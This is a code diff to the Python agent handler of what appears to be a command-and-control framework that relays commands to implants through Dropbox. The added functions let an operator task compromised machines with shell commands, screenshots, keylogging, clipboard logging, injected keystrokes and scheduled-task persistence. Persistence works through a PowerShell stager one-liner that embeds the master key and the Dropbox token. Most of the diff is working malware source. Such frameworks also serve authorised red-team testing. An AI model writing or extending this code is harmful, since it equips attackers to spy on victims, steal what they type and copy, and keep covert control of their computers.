@@ -1,6 +1,7 @@
 # -*- coding: utf8 -*-
 import config as cfg
 from lib import helpers
+from lib import stagers
 from lib.crypto import Crypto
 import os.path
 
@@ -23,13 +24,24 @@ class AgentHandler:
 		task = self.statusHandler.createTask(self.agentID, "runCLI", args = [cmd])
 		
 		# Prepare the task format, then put the task into the command file
-		data = "runCLI\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))
+		data = "runCLI\n{}\n{}\n{}".format(task['id'], cmd, helpers.randomString(16))
 		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
 
 		if r is not None:
 			# Commit this task for the current agent
 			self.statusHandler.commitTask(task)
 			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+	#------------------------------------------------------------------------------------
+	def taskAgentWithShell(self, cmd):
+		# Prepare the task format, then put the task into the command file
+		data = "shell\n{}\n{}\n{}".format("n/a",cmd,helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+
+		if r is not None:
+			print helpers.color("[+] Agent with ID [{}] has been tasked with shell command".format(self.agentID))
 		else:
 			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
 
@@ -160,6 +172,93 @@ class AgentHandler:
 		else:
 			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
 	
+	#------------------------------------------------------------------------------------
+	def taskAgentWithScreenshot(self):
+		# Create a task
+		task = self.statusHandler.createTask(self.agentID, "screenshot")
+		
+		# Prepare the task format, then put the task into the command file
+		data = "screenshot\n{}\n{}".format(task['id'], helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+		
+		if r is not None:
+			# Commit this task for the current agent
+			self.statusHandler.commitTask(task)
+			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+	#------------------------------------------------------------------------------------
+	def taskAgentWithKeylogger(self, action):
+		# Create a task
+		task = self.statusHandler.createTask(self.agentID, "keylogger", args = [action])
+		
+		# Prepare the task format, then put the task into the command file
+		data = "keylogger\n{}\n{}\n{}".format(task['id'], action, helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+		
+		if r is not None:
+			# Commit this task for the current agent
+			self.statusHandler.commitTask(task)
+			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+	#------------------------------------------------------------------------------------
+	def taskAgentWithClipboardLogger(self, action):
+		# Create a task
+		task = self.statusHandler.createTask(self.agentID, "clipboardlogger", args = [action])
+		
+		# Prepare the task format, then put the task into the command file
+		data = "clipboardlogger\n{}\n{}\n{}".format(task['id'], action, helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+		
+		if r is not None:
+			# Commit this task for the current agent
+			self.statusHandler.commitTask(task)
+			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+
+	#------------------------------------------------------------------------------------
+	def taskAgentWithSendKeystrokes(self, procName, keyStrokes):
+		# Create a task
+		task = self.statusHandler.createTask(self.agentID, "sendkeystrokes", args = [procName, keyStrokes])
+		
+		# Prepare the task format, then put the task into the command file
+		data = "sendkeystrokes\n{}\n{}\n{}\n{}".format(task['id'], procName, keyStrokes, helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+		
+		if r is not None:
+			# Commit this task for the current agent
+			self.statusHandler.commitTask(task)
+			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
+	#------------------------------------------------------------------------------------
+	def taskAgentWithPersist(self, stageName):
+		# Create a task
+		task = self.statusHandler.createTask(self.agentID, "persist", args = [stageName])
+		
+		# Persistency is achieved by setting a scheduled task on a powershell oneliner stager
+		stagerParameters = { 'stagePublicURL': self.statusHandler.publishedStageList[stageName], 'xorKey': Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256"), 'masterKey': helpers.b64encode(self.statusHandler.masterKey), 'accessToken': self.dropboxHandler.token }
+		genStager = stagers.GenStager(stagerParameters)
+		oneLiner = genStager.oneLiner()
+		
+
+		# Prepare the task format, then put the task into the command file
+		data = "persist\n{}\n{}\n{}".format(task['id'], oneLiner, helpers.randomString(16))
+		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
+		
+		if r is not None:
+			# Commit this task for the current agent
+			self.statusHandler.commitTask(task)
+			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
+		else:
+			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
+
 	#------------------------------------------------------------------------------------
 	def taskAgentWithStop(self):
 		# Create a task
